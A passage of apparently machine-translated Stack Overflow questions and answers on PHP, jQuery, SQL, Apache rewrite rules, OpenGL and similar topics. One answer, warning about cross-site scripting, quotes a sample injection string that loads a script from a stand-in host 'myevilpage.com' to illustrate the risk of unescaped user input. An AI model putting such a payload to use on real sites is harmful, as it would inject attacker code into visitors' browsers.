   // do soemthing
   break;
case 'del_user':
   // do something
   break;
} 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:32:56.953

我将牢牢抓住我的两分钱，进入这个讨论。

**使用单个表单处理程序取决于表单的相似程度/收集的数据的相似程度**

如果您有许多或多或少相同的表单（相同的字段，相同的逻辑，只是细微的差异，例如谁通过电子邮件收到表单的每个实例的内容），那么有一个可以处理所有这些的处理程序表格是最好的方法。

如果您有许多表单，除了它们是表单这一事实之外没有任何共同点（或很少），那么使用单个处理程序可能不是最佳选择。话虽如此，您可以根据相似性将表单分组为“系列”，然后为每个系列构建处理程序。（即“发送电子邮件”系列、“文件上传”系列等）

在维护方面，更少的文件当然是一个加分项，因为您需要查找的地方更少，但您不应该牺牲责任/功能的逻辑分离来将所有内容都塞进一个文件中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T03:18:09.470

我不认为有任何标准的方法可以做到这一点。这都是关于偏好的。编写代码的美妙之处在于您可以创建解决方案，如果它适用于您正在做的事情，那就没问题了。如果您稍后确定它需要返工，那么您可以。

如果您的代码大小变得难以处理，您可以随时将其分解为单独的文件，然后在您的案例语句中调用 include("file_name.php") 来执行您需要的脚本。

```
switch($_POST['my_case']) {
  case 'add_user':
    include("add_user.php");
    break;
  case 'del_user':
    include("del_user.php");
  break;
} 
```

如果事情变得非常复杂，那么您可能会考虑类。在这种情况下，您可以有一个具有添加方法和删除方法的用户类，然后您将包含用户类，然后像这样使用它。

```
$user = new User();

$user->add();
$user->delete(); 
```

就像我说的那样，这一切都取决于您的具体需求。找到适合您的方法并顺其自然。

要回答隐藏输入，如果您必须使用 POST 方法，那么这将是必要的。您还可以使用 GET 并将某种指示符附加到表单 url 的查询部分。像 ?action=add

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-07T03:48:14.247

These days, you would implement what's called a RESTful API. In addition to POST, HTTP supports DELETE, GET, and PUT methods. Use the type of submission to determine what action your code should execute.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-07T03:09:29.000

这样做会创建一个单一的入口点，其他程序员可以使用它来遵循程序逻辑。如果有 50 个 PHP 文件，每个文件都针对不同的表单或 AJAX 请求，无论它们的名称多么好，查看代码库的其他程序员将不知道它们的用途。像这样的单一入口点为您和其他程序员提供了更容易的可读性和可维护性。

*编辑：*让我明确一点，我不建议将所有代码都放在一个文件中。您可以拥有五十个 PHP 文件。但是在这个带有 case 语句的文件中，你可以拥有：

```
switch($_POST['my_case']) {

    case 'add_user':
    include_once 'add_user_handler.php';
    // call function in add_user_handler.php to initiate execution
    break;

   case 'del_user':
   include_once 'del_user_handler.php';
   // call function in del_user_handler.php to initiate execution
   break;

   // And of course, good programming practice, use default
   default:
   exit("Unable to handle request");
   break;
} 
```

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2012-12-07T03:09:42.337

好的，我从来没有读过这个，但在我的情况下，我通常不使用表单，我的意思是，我不使用经典按钮“提交”，而不是使用 ajax 我发送所有内容并通过事件，当用户点击图片（如按钮）或类似内容。关键是，多亏了这个，我可以只使用一个控制器（这是你的问题）从一个部分发送不同的部分（比如它们是不同的形式）。我从来没有遇到过问题，真的这样你就可以很好地处理所有事情，因为你绑定了 CONTROLLER--VIEW--FORMS_OF_THIS_VIEW。这是管理所有信息的好方法，因为通常您有一个与问题（汽车、偏好、优惠、登录等）匹配的视图和控制器。通过这种方式，您可以轻松找到一切（控制器、视图、所有表单、进程）

# javascript - 下一步点击按键

> ID：13756285
> 
> 赞同：2
> 
> 时间：2012-12-07T03:00:26.070
> 
> 标签：javascript, jquery, redirect, keypress

我正在制作一个画廊并试图弄清楚如何对箭头键进行编程以导航画廊。

因此，按向左箭头将转到上一个图像 url：

```
function window.location = 'http://www.example.com/prevphoto.php'; 
```

按向右箭头将转到下一个图像 url。

```
function window.location = 'http://www.example.com/nextphoto.php'; 
```

**更新**（感谢 Haxxed 为我指明了正确的方向）这是我所在的位置，但它不起作用。你能看出为什么吗？

```
$('body').keypress(function (e) {
    if (e.which == 37) {
        // Left Arrow Pushed
        window.location = "/prevphoto.php";
    } else if (e.which == 39) {
        // Right Arrow Pushed
        window.location = "/nextphoto.php";
    }
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T03:13:00.883

基本上你需要让body标签有一个按键事件（或使用jquery来制作一个事件监听器）然后只检查键码（左箭头是37，右箭头是39）然后使用window.location重定向页面. [所有关键代码](http://www.cambiaresearch.com/articles/15/javascript-char-codes-key-codes)

```
<head>
    <script>
           function e(event){
            if(event.keyCode == 37){
                //Left Arrow Pushed
                window.location = "../prevphoto.php";
            }else if(event.keyCode == 39){  
                //Right Arrow Pushed     
                window.location = "../nextphoto.php";
            }        
        } 
    </script>
</head>    
<body onKeyPress="e(event)" >

</body>​ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T04:05:47.450

尝试将脚本放在您的 head 标签中，然后修改`body`以使用`document`.

```
$(document).keypress(function (e) {

    if (e.which == 37) {
        //Left Arrow Pushed
        window.location = "/prevphoto.php";
    } else if (e.which == 39){ 
        //Right Arrow Pushed     
        window.location = "/nextphoto.php";
    }

}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-07T04:31:36.463

请参阅此相关答案：[https ://stackoverflow.com/a/5597114/380487](https://stackoverflow.com/a/5597114/380487)

您需要监听`keydown`事件，而不是`keypress`事件。

# sql - 列出从事其部门赞助的一个项目以及从事非其部门赞助的一个项目的员工的姓名

> ID：13756289
> 
> 赞同：1
> 
> 时间：2012-12-07T03:00:58.793
> 
> 标签：sql, oracle11g

我的代码是

```
select name
from employee e, workon w
where e.empid = w.empid
and pid in
   (select pid 
    from workon
    where did in
         (select did
          from employee ee
          where e.did = ee.did))
group by name 
```

但我知道这是不对的，因为我还需要找一个在他部门以外的项目中工作的人。问题是我不太确定该怎么做。

表员工

```
EMPID   NAME    SALARY  DID
1   kevin   32000   2
2   joan    46200   1
3   brian   37000   3
4   larry   82000   5
5   harry   92000   4
6   peter   45000   2
7   peter   68000   3
8   smith   39000   4
9   chen    71000   1
10  kim 46000   5
11  smith   46000   1 
```

从事于

```
PID EMPID   HOURS
3   1   30
2   3   40
5   4   30
6   6   60
4   3   70
2   4   45
5   3   90
3   3   100
6   8   30
4   4   30
5   8   30
6   7   30
6   9   40
5   9   50
4   6   45
2   7   30
2   8   30
2   9   30
1   9   30
1   8   30
1   7   30
1   5   30
1   6   30
2   6   30
Project 

PID PNAME   BUDGET  DID
1   DB development  8000    2
2   network development 6000    2
3   Web development 5000    3
4   Wireless development    5000    1
5   security system 6000    4
6   system development  7000    1 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T03:45:14.717

```
select e.name
from employee e
where
    -- Projects in department
    exists (
        select *
        from 
            workon w
            join project p
                on w.pid = p.pid
                and p.did = e.did
        where w.empid = e.empid
    )
    -- Projects out of department
    and exists (
        select *
        from 
            workon w
            join project p
                on w.pid = p.pid
                and p.did != e.did
        where w.empid = e.empid
    ) 
```

# php - 另一个 Cookie 错误

> ID：13756291
> 
> 赞同：0
> 
> 时间：2012-12-07T03:01:09.657
> 
> 标签：php, cookies

我正在制作另一个项目，我正在使用 cookie 来存储一些不重要的登录信息。

我的问题是，如果我去“www.domain.com”，可以访问cookie，但是，如果我去“domain.com”，则无法访问cookie。

我正在用 PHP 编写我的项目，所以如果有人有答案，或者这个问题的解决方案会很棒。

谢谢，马克。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T03:27:43.777

设置 cookie 时，将其设置为 .domain.com。

```
ini_set('session.cookie_domain', '.site-name.com'); 
```

或者

```
setcookie ("cookie_name", "", time() + 3600, "/", ".site-name.com", 1); 
```

# javascript - 从我们的 api 通过网络发送 javascript 的安全性；有没有更好的办法？

> ID：13756294
> 
> 赞同：0
> 
> 时间：2012-12-07T03:01:41.907
> 
> 标签：javascript, api, jsonp, javascript-security

我们有一个非常简单的 api 并且想要返回在另一个站点上呈现一些内容。我想从我们的 api 端点发送类似的东西（例如[http://domain.com/api/endpoint/1](http://domain.com/api/endpoint/1)就像 <script src='http://domain/api/endpoint/1'> </脚本>）：

```
document.write('here is my value<br />');
document.write('Let me give you some inforamtion about this<br />'); 
```

并逃脱它。无需担心 https 或内容。有两个人含糊地告诉我，他们认为这是不安全的，但我真的不明白如果我们正确处理它会怎么样（无论如何这都是真的）？这安全吗？我错过了什么吗？JSONP 对于这样的事情来说太过分了——我们想要最简单的技术。

提前谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T05:05:16.253

只要您同时控制两个域，您就可以将一个域中的脚本包含到另一个域的网页中，这并不存在安全问题。有很多网站从 CDN 或内容子域或整个其他域提供脚本标签。

document.write 的使用已经过时，可能会让您头疼。

您唯一需要考虑的安全问题是，如果您的 API 允许将用户内容文档写入页面，那么您将容易受到跨站点脚本攻击，其中有人将他们的用户名设置为如下所示：

```
/><script>document.write('<script src="myevilpage.com"></script>'</script> 
```

然后你的代码很高兴地将它注入页面，然后访问它的每个人都会感染病毒并且他们的计算机会爆炸。通常，您需要在将任何基于用户的输入发送到您的 API 之前对其进行转义，还要在您的 javascript 中对其进行清理，然后将其作为 textNode 或类似技巧插入页面以阻止人们能够操纵您的页面。

# php - 通过下拉菜单更改 PHP 变量

> ID：13756300
> 
> 赞同：0
> 
> 时间：2012-12-07T03:02:33.343
> 
> 标签：php

我在 PHP 中有一个变量，它控制应该从数据库中显示的项目数。

```
$per_page = 16; 
```

然后我继续对它进行分页，因为数据库中有几百个项目。太酷了，我每页显示 16 个项目，用户可以单击第 1 2 3 页等，你明白了。

但现在我想插入一个下拉框，允许用户选择显示的项目数量。

最初我想使用下拉菜单来做到这一点，我这样做了：

```
 echo 'Items per page';
            echo '<br>';
            echo '<select id="dropdown">';
            echo '<option value="1">20</option>';
            echo '<option value="2">40</option>';
            echo '<option value="3">All</option>';
            echo '</select>'; 
```

然后，如果我可以将其存储在 $item_number 之类的变量中，那么我可以更改 $per_page 以通过可能执行类似的操作来反映选择

```
$per_page = $item_number 
```

但我的问题是让下拉菜单告诉 $item_number 显示多少，这样它就可以告诉 $per_page。不太确定我是否会以这种正确的方式进行此操作，但非常感谢任何帮助。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T03:07:32.183

您需要将下拉列表作为表单或 AJAX 发送到 PHP 脚本，该脚本将在会话变量中存储所需的 item_number，或者写入数据库并从那里读取。

# c# - 如何在 WinForm C# 中将数据导出到 Excel 工作表？

> ID：13756303
> 
> 赞同：0
> 
> 时间：2012-12-07T03:02:51.593
> 
> 标签：c#, winforms, excel

这是我的代码：

使用 Excel = Microsoft.Office.Interop.Excel；

```
private void button5_Click(object sender, EventArgs e)
{
    SqlCommand cmd = new SqlCommand();
    int colIndex = 1;
    int rowIndex = 1;
    Excel.Application xlApp;
    Excel.Workbook xlWorkBook;
    Excel.Worksheet xlWorkSheet;
    object misValue = System.Reflection.Missing.Value;
    xlApp = new Excel.Application();
    Con.Open();
    cmd.Connection = Con;
    cmd.CommandType = CommandType.Text;
    cmd.CommandText = "select * from Table1";
    SqlDataReader reader = cmd.ExecuteReader();
    DataTable dt = new DataTable();
    dt.Load(reader);
    xlApp = new Excel.Application();
    xlWorkBook = xlApp.Workbooks.Add(misValue);
    xlWorkSheet = (Excel.Worksheet)xlWorkBook.Worksheets.get_Item(1);

    foreach (DataRow dr in dt.Rows)
    {
        rowIndex = rowIndex + 1;
        colIndex = 0;
        foreach (DataColumn dc in dt.Columns)
        {
            colIndex = colIndex + 1;
            xlWorkSheet.Cells[rowIndex + 1, colIndex] = dr[dc.ColumnName];
        }
    }

    xlApp.Visible = true;
    ObjectRelease(xlWorkSheet);
    ObjectRelease(xlWorkBook);
    ObjectRelease(xlApp);
} 
```

它将“Table1”中的所有数据导出到 Sheet1。但我想导出：

第 1 行 => 表 1

第 2 行 => 表 2

第 3 行 => 表 3

...

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T03:14:41.710

查看代码`xlWorkSheet = (Excel.Worksheet)xlWorkBook.Worksheets.get_Item(1);`它应该得到第一张纸。

如果您将那行代码拉到循环中，并将其更改`1`为`rowIndex`，它应该进入连续的工作表。我唯一不知道的是您是否可以“获取”尚不存在的工作表，因此您可能需要创建新工作表。

# javascript - jQuery jCarousel - 在水平视口中对齐项目

> ID：13756307
> 
> 赞同：0
> 
> 时间：2012-12-07T03:03:20.983
> 
> 标签：javascript, jquery, html, css, jcarousel

我的 jcarousel 安装有问题。目前我设置它的方式是连续三个项目，视口为 1140 像素。jcarousel 会自动调整这些项目并将它们设置为 380px 宽以正确适应视口。margin-right 似乎也是自动定义的。我在视口内均匀地证明我的三个项目时遇到问题。我查看了 jcarousel 选项，但没有找到任何可能有帮助的东西。这是应该解释我的问题的屏幕截图：

[http://i.imgur.com/PRQIG.jpg](http://i.imgur.com/PRQIG.jpg)

编辑：我找到了一个解决方案，这是我唯一能想到的。如果有人知道更好的解决方案，请发布！

我的页面基于 1140 响应式网格系统。在我的网格系统中，三列行的右边距约为 3.8%，每列的宽度约为 30%。因此，对于我的轮播的水平视口 (.jcarousel-clip-horizo​​ntal)，我将其宽度设置为 103.8% 而不是 100%，这允许三个项目在页面容器中平均扩展。

我试图调整单个项目的边距和填充，但这是不正确的。起初，我在 carousel 容器上放置了一个左填充以使其外观居中，但这对于我的响应式布局来说还不够。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T03:49:05.857

If you don't like the width jcarousel automatically does you can set it yourself in the setupCallback:function(){} with the jcarousel setup

for example: you want to set each li with the width 375, you can do this:

```
$('#a').jcarousel({
        visible:3,
        scroll:3,
        setupCallback:function(){
           $('#a.jcarousel-list li').each(function(){
                $(this).width(375)
           })
        },
}) 
```

you can modify padding/margin on each item or on the viewport with setupCallback:function(){} to achieve what you want.

# javascript - 带有ajax加载内容的倒数计时器（jquery mobile）不起作用

> ID：13756308
> 
> 赞同：0
> 
> 时间：2012-12-07T03:03:28.753
> 
> 标签：javascript, jquery, html, jquery-mobile, xhtml

我在让倒数计时器在我的 jQuery 移动页面上工作时遇到了一些麻烦。如果我将它加载到静态 html 页面上，它应该可以正常工作（请参阅该页面：http://www.beingproperties.com/match-game）。当您点击开始游戏时，计时器开始。

我最近将它移植到了 jQuery 移动框架，但计时器在该站点上不起作用（通过转到链接并单击“多页链接，然后单击开始游戏链接”来查看此处）：[http://www .beingproperties.com/match-game/home.html](http://www.beingproperties.com/match-game/home.html)）。

我已经使用“pageshow”作为下面的场景进行绑定，虽然我让它工作并发出警报，但一旦我添加我的代码来执行，什么都没有发生。

```
$('#shapesPage').live('pageshow', function () { 
```

我知道这是关于 ajax 加载页面的问题，尽管除倒数计时器之外的所有其他 jQuery 都会在此页面上触发。我很茫然，非常感谢朝着正确的方向踢球。

我使用了检查器，它的信息量不是很大。任何解决此问题的见解或调试这些类型问题的正确方法将不胜感激。提前致谢。-克里斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T03:43:26.697

Looking at the source for `home.html`, it seems that you haven't included `js/plugins.js`, only `js/index.js`.

I know you've included it in `shapes.html`, but JQM is a bit weird about loading external scripts when loading a page via ajax, as stated in the [documentation](http://jquerymobile.com/test/docs/pages/page-scripting.html):

> The simplest approach when building a jQuery Mobile site is to reference the same set of stylesheets and scripts in the head of every page. If you need to load in specific scripts or styles for a particular page, we recommend binding logic to the pageinit event (details below) to run necessary code when a specific page is created (which can be determined by its id attribute, or a number of other ways). Following this approach will ensure that the code executes if the page is loaded directly or is pulled in and shown via Ajax.

**Edit**: You can not call any functions that modify the DOM until it is fully loaded. This is signaled in JQM by the `pageinit` event. Read about [scripting](http://jquerymobile.com/test/docs/pages/page-scripting.html) and [events](http://jquerymobile.com/test/docs/api/events.html) for more info.

Try surrounding your javascript for `shapes.html` with

```
$( document ).delegate("#shapesPage", "pageinit", function() {
  ...
}); 
```

# apache - 用于维护页面重定向的 htaccess 代码

> ID：13756309
> 
> 赞同：2
> 
> 时间：2012-12-07T03:03:43.967
> 
> 标签：apache, .htaccess

我设置了一个可以通过 htaccess 文件启用的维护页面。html 文件位于名为“maintenance”的文件夹中。

html 文件中有一些图像。但是，页面的访问者看不到图像，即使我添加了`RewriteCond`一行（理论上）允许它们。

如果我尝试直接在浏览器中访问图像文件的 URL，它会重定向到 maintenance.htm 页面。我不想重定向图像文件。

我错过了什么吗？

```
#RewriteCond %{REMOTE_ADDR} !^127.0.0.1$
#RewriteCond %{REMOTE_ADDR} !^111.111.111.111$
RewriteCond %{REQUEST_URI} !/maintenance/maintenance\.htm$ [NC]
RewriteCond %{REQUEST_URI} !\.(jpg|jpeg|png|gif|css|ico)$ [NC]
RewriteRule ^(.*)$ /maintenance/maintenance.htm [R=302,L] 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-07T05:38:43.333

我认为这会起作用：

```
<IfModule mod_rewrite.c>
  RewriteEngine on
  # RewriteCond %{REMOTE_ADDR} !^127.0.0.1$
  # RewriteCond %{REMOTE_ADDR} !^111.111.111.111$
  RewriteCond %{REQUEST_URI} !/maintenance/maintenance\.htm$ 
  RewriteCond %{REQUEST_URI} !\.(jpg|jpeg|png|gif|css|ico)$ 
  RewriteRule ^(.*)$  /maintenance/maintenance.htm [L]
</IfModule> 
```

在处理规则之前，我添加了一个条件来确认重写模块处于活动状态。问题规则和条件不会被修改。

这条规则在[这里](http://htaccess.madewithlove.be/)进行了测试。

# java - java.util.NoSuchElementException：无法创建经过验证的对象，原因：ValidateObject 失败

> ID：13756316
> 
> 赞同：1
> 
> 时间：2012-12-07T03:04:49.723
> 
> 标签：java, mysql, connection-pooling

我想知道以下异常是什么意思。当我设置 testOnBorrow=ture 时，我得到了这个。如果我设置 testOnBorrow=false，我不会得到这个。

我正在使用 MySQL 5.1.66 和 commons-pool-1.5.5.jar

`Caused by: java.util.NoSuchElementException: Could not create a validated object, cause: ValidateObject failed at org.apache.commons.pool.impl.GenericObjectPool.borrowObject(GenericObjectPool.java:1203) at org.apache.commons.dbcp.PoolingDriver.connect(PoolingDriver.java:180) ... 7 more`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-06T17:18:57.910

我想你打错了`true`。

你的代码：

```
testOnBorrow=ture 
```

应该：

```
testOnBorrow=true 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-12-28T16:40:32.263

这就是 Tomcat 文档中关于 testOnBorrow 的内容...

testOnBorrow：

```
(boolean) The indication of whether objects will be validated before being borrowed from the pool. 
If the object fails to validate, it will be dropped from the pool, and we will attempt to borrow another. 
NOTE - for a true value to have any effect, the validationQuery or validatorClassName parameter must be set to a non-null string. 
In order to have a more efficient validation, see validationInterval. 
Default value is false 
```

验证查询：

```
(String) The SQL query that will be used to validate connections from this pool before returning them to the caller. 
If specified, this query does not have to return any data, it just can't throw a SQLException. 
The default value is null. 
Example values are SELECT 1(mysql), select 1 from dual(oracle), SELECT 1(MS Sql Server) 
```

[https://tomcat.apache.org/tomcat-7.0-doc/jdbc-pool.html](https://tomcat.apache.org/tomcat-7.0-doc/jdbc-pool.html)

# join - 索引、聚集索引的作用以及主键与那些的区别

> ID：13756317
> 
> 赞同：0
> 
> 时间：2012-12-07T03:04:54.483
> 
> 标签：join, indexing, primary-key, clustered-index

我`m student studying DB.. I was studying big physical three join operations(nested loop, sort merge, and hash join). and I don`不知道如何将索引与上述连接一起使用..

在这里我有问题..

到底什么是索引...？这只是关键吗？它的数据结构是什么？是真实记录的地址和..索引属性名称的组合吗？

我想知道有关索引如何用作“键”的详细信息。

据我所知，聚集索引是与真实表排序索引匹配的索引。

非聚集索引是对表中实际匹配列的“地址指针”进行排序的索引。

从上面，

那我得这样想。。

那么当我们创建表并指定一个属性作为主键时，它的作用是什么？

主键成为默认聚集索引？？并且物理上表的行数据按该主键排序？

还是磁盘上的真正顺序只是插入行数据时的顺序？主键仅用于表之间的关系，不会像索引一样产生任何影响？

那么当我们创建聚集索引时，那么磁盘上的物理顺序会重新排序吗？

这里是我真的无法理解的事情......

怎么说“有了索引，当我们想找到满足特定谓词的数据行时，速度要快得多，因为它已经排序了”

（我在学习sort-merge join的时候发现。消息来源说从每两个表中，如果他们有索引，他们就不需要排序阶段，可以直接合并..）

index 在我们创建索引时使表排序？我不知道为什么它说索引就像'神奇的工具'..

谢谢你。我知道我写得很分散注意力，但我太困惑了，这些正是我脑海中的想法......

*   当涉及到排序合并连接时，

如果他们说“从索引表到真实数据表，它通过 rowid 访问”，ROWID 是什么意思？是主键的不同还是什么？？？？

十分感谢...

*在甲骨文，MySQL的情况下？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-08T04:08:05.533

我认为您的问题是我网站上的答案：

*   [http://use-the-index-luke.com/](http://use-the-index-luke.com/)

特别是您应该对以下章节感兴趣：

*   [第 1 章：索引剖析](http://use-the-index-luke.com/sql/anatomy)
*   [第 3 章：连接操作](http://use-the-index-luke.com/sql/join)
*   [第 5 章：排序和分组](http://use-the-index-luke.com/sql/sorting-grouping)

但最好看一下完整的 TOC：

*   [完整目录](http://use-the-index-luke.com/sql/table-of-contents)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T03:32:34.820

在关系数据库中，主键是默认索引。假设表 T1 中有 r1....to rn 行，C1......to Cn 列，主键为 P1，那么 P1 是默认索引。但是，如果你想要搜索表 T1 的 C5 列，然后如果该列 C5 没有索引，则搜索算法搜索从 r1...到 rn 的每一行，每列 C1 ....Cn。如果搜索单行的时间是T1，则搜索表单列的时间=T1/Cn(近似)。但是，当你索引表T1的C5列时，搜索引擎算法的执行顺序是先搜索主键然后搜索索引键，所以访问时间C5的值在时间上小于T1/Cn。何时选择分度。情况1：

# visual-c++ - 增加 OpenGL 的远裁剪平面距离

> ID：13756319
> 
> 赞同：4
> 
> 时间：2012-12-07T03:05:19.113
> 
> 标签：visual-c++, clipping, opengl-3

我正在尝试制作我们太阳系的 C++ OpenGL 表示，作为自学 OpenGL 的一种方式，所以请保持你的答案简单。我遇到的问题是行星距离很远，所以从任何给定的行星观看时，其他一切都超出了剪切平面。**如何将 C++ OpenGL 3.1 平面的剪裁移动到，比如说`2000000000`？**如果可以的话，我更喜欢一个简单的代码片段。我已经查看了关于此的 SO 和论坛帖子，但它们要么太旧以至于什么都不适用（使用旧版 API 或只是死链接），要么太复杂以至于我无法弄清楚他们在说什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:22:11.087

裁剪平面由透视投影矩阵定义。

如果使用`glFrustum`，请将传递给它的最后一个参数更改为 2000000000.0。

如果您使用自己的矩阵，请将矩阵数组的第 10 个元素设置为：

`(2000000000.0+nearClippingPlane)/(nearClippingPlane-2000000000.0)`

（公式为`(far+near)/(near-far)`）

第十四至：

`(-4000000000.0*nearClippingPlane)/(2000000000.0-nearClippingPlane)`

（公式为`(-2.0*near*far)/(far-near)`）

但是，2000000000 是非常大的价值，因此如果添加山脉等细节，可能会发生 Z-fighting。

# iphone - UIImagePickerController 图像，显示到另一个类

> ID：13756320
> 
> 赞同：0
> 
> 时间：2012-12-07T03:05:27.303
> 
> 标签：iphone, objective-c, ios, xcode

我想出现在用“ViewController”拍摄的“PreviewViewController”图片的“UIImageView”中。

但是我不能。

请告诉我

视图控制器.m

```
-(void)imagePickerController:(UIImagePickerController *)pic  didFinishPickingMediaWithInfo:(NSDictionary *)info
{
  [imagePicker dismissViewControllerAnimated:YES completion:NO];

  UIImage *originalImage;
  originalImage = [info objectForKey:UIImagePickerControllerOriginalImage];

CGSize  size = { 100, 200 };
UIGraphicsBeginImageContext(size);

CGRect  rect;
rect.origin = CGPointZero;
rect.size = size;
[originalImage drawInRect:rect];
UIImage*    shrinkedImage;
shrinkedImage = UIGraphicsGetImageFromCurrentImageContext();
UIGraphicsEndImageContext();

CGRect r = CGRectMake(0, 60, 100, 100);
CGImageRef cgImage = CGImageCreateWithImageInRect(shrinkedImage.CGImage, r);
iconImage = [UIImage imageWithCGImage:cgImage];
UIImageWriteToSavedPhotosAlbum (iconImage, nil, nil , nil);

// This problem!!!
PreviewViewController *p = [[PreviewViewController alloc] init];
p.imagePreview.image = iconImage;
[self presentViewController:p animated:YES completion:NO];
} 
```

PreviewViewController.h

```
@property (nonatomic) UIImageView *imagePreview; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T03:11:16.023

您是否创建了一个可以接收您的 iconImage 的 UIImageView？
乍一看，我会说，`p.imagePreview == nil`当您尝试为其分配图像时。

如果它是在 .xib 中创建的，请确保已连接出口。

* * *

从您的评论中，我了解到您正在创建 UIImageView `viewDidLoad`，在要求视图进入屏幕之前通常不会调用它（有一些方法可以强制它更快地附加）。
这意味着这`p.imagePreview`可能是`nil`您在那里分配图像的时候。
您是否尝试放置`breakpoint`或`NSLog(@"%@", p.imagePreview);`查看实例是否有效？
如果是`nil`在那个时候，我至少可以想到两种解决方法。

* * *

你需要修改 UIViewController 生命周期来理解为什么你的 p.imagePreview 是`nil`.
我建议您将生命周期方法`NSLog()`的每个方法放在开头。`UIViewController`（所有 viewDid...、viewWill...、）以清楚地了解生命周期并了解系统何时调用事物。

至于您的问题，您可以在那里定义`@property (nonatomic, strong) UIImage *anImage`和存储要在图像视图中使用的图像，并在初始化 UIImageView 时使用该图像`viewDidLoad`。
由于您没有使用 .xib，因此您还应该考虑覆盖 .xib `loadView`。

# c - 这个指令是什么意思（subl $20, %esp）？

> ID：13756321
> 
> 赞同：1
> 
> 时间：2012-12-07T03:05:27.710
> 
> 标签：c, assembly

C代码是：

```
int rSum(int *Start, int Count)
{
        if (Count <= 0)
        return 0;
        return *Start + rSum(Start+1, Count-1);
} 
```

对应的汇编代码为：

```
.file "test98.c"
.text
.globl rSum
.type rSum, @function
rSum:
pushl %ebp
movl %esp, %ebp
pushl %ebx
subl $20, %esp
cmpl $0, 12(%ebp)
jg .L2
movl $0, %eax
jmp .L3
.L2:
movl 8(%ebp), %eax
movl (%eax), %ebx
movl 12(%ebp), %eax
leal -1(%eax), %edx
movl 8(%ebp), %eax
addl $4, %eax
movl %edx, 4(%esp)
movl %eax, (%esp)
call rSum
leal (%ebx,%eax), %eax
.L3:
addl $20, %esp
popl %ebx
popl %ebp
ret
.size rSum, .-rSum
.ident "GCC: (Ubuntu/Linaro 4.4.4-14ubuntu5) 4.4.5"
.section .note.GNU-stack,"",@progbits 
```

我无法理解这个指令“subl $20, %esp”，为什么是 $20？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-07T03:06:25.757

`subl $20, %esp`从堆栈指针中减去 20 ( `esp`)。这在堆栈上分配了 20 个字节的空间，可用于局部变量。

# php - PHP Mailer 发送重复消息

> ID：13756322
> 
> 赞同：1
> 
> 时间：2012-12-07T03:05:28.070
> 
> 标签：php, email, phpmailer

我正在尝试向存储在 mysql 数据库中的一组人发送消息，这些人的值为 name 和 email。现在我只是想发送一封电子邮件，上面写着“你好 $name”。出于某种原因，每个人都收到了电子邮件，但他们收到了所有三封电子邮件，每封都说“你好（不同的名字）”

以下是相关代码：

```
$result = mysql_query("SELECT `name`, `email` FROM `emails`");

    while ($rows = mysql_fetch_array($result))
    {   
        $name = $rows["name"];
        $email = $rows["email"];

        $mail->AddAddress($email, $name);

        $mail->Subject = "Your Daily Update";

        $mail->Body = "Hello $name, ";

        if(!$mail->Send()) 
        {
        echo 'Mailer error: ' . $mail->ErrorInfo;
        } 
    } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-07T03:07:27.543

每次通过循环时，您都需要将 $mail 对象重置为新实例。否则，您将一遍又一遍地将地址添加到同一个邮件中。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-07T03:17:34.270

尝试这个：

```
$result = mysql_query("SELECT `name`, `email` FROM `emails`");

    while ($rows = mysql_fetch_array($result))
    {   
        $name = $rows["name"];
        $email = $rows["email"];
        $mail->ClearAddresses();
        $mail->AddAddress($email, $name);

        $mail->Subject = "Your Daily Update";

        $mail->Body = "Hello $name, ";

        if(!$mail->Send()) 
        {
        echo 'Mailer error: ' . $mail->ErrorInfo;
        } 
    } 
```

我添加了`$mail->ClearAddresses();`这将清除之前添加的任何电子邮件。

# c - 扫描并确定在命令提示符下输入的参数！（过得很辛苦）

> ID：13756333
> 
> 赞同：1
> 
> 时间：2012-12-07T03:06:33.143
> 
> 标签：c, windows, command-line-arguments

快速编辑：这是一个家庭作业。我的目标是为我的程序接收一些 cl 参数（-s、-w 与宽度长度和文件）并根据默认长度 40 个字符或用户选择的新数字换行文件'-w' 选项。

我正在尝试编写一个通过命令提示符接收参数的 C 程序（可执行文件名为“wrapfile.exe”）。该程序还没有完成，还有更多内容要添加，这只是它的一部分，它给我带来了混乱。

以下是有效命令提示符条目的示例：

```
C:\"within wrapfile.exe's directory"> wrapfile -s filename.txt
C:\"within wrapfile.exe's directory"> wrapfile -w 5 filename.txt
C:\"within wrapfile.exe's directory"> wrapfile -s -w 50 filename.txt 
```

等等

无效条目示例：

```
C:\"within wrapfile.exe's directory"> wrapfile 
C:\"within wrapfile.exe's directory"> wrapfile -w
C:\"within wrapfile.exe's directory"> wrapfile qwer 
```

等等

我的问题是在我输入“-w”后它无法检测到数字..

这是代码：

```
#include "stdio.h"
#include "stdlib.h"
#include "io.h"
#include "string.h"

int main(int argc, char *argv[])
{
int output = 0;
int commands = 1;
int wraplength= 41;
int i=0;
int counter=0;
int wordwrap = 0;
int ExitStatus = 1;
int input = 1;
int w = 0;
int s = 0;
FILE *f = NULL;

for (i=0; i < argc; i++)
{
